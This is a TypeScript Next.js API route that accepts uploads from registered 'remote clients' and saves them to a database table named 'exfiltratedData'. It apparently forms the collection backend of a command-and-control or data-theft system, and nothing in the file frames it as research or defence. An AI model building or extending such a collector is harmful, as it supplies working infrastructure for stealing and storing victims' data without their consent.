import { NextResponse } from "next/server"
import { prisma } from "@/lib/prisma"

export async function POST(req: Request) {
  try {
    const body = await req.json()
    const { type, source, data, clientId: clientUuid } = body

    if (!type || !data) {
      return NextResponse.json({ error: "type and data required" }, { status: 400 })
    }

    let record: any = null

    if (clientUuid) {
      const client = await prisma.remoteClient.findUnique({
        where: { clientId: clientUuid },
      })
      if (client) {
        record = await prisma.exfiltratedData.create({
          data: {
            clientId: client.id,
            type,
            source: source || null,
            data: typeof data === "string" ? data : JSON.stringify(data),
          },
        })
      }
    }

    return NextResponse.json({ success: true, id: record?.id || null })
  } catch (error) {
    console.error("[REGISTER_DATA]", error)
    return NextResponse.json({ error: "Internal error" }, { status: 500 })
  }
}
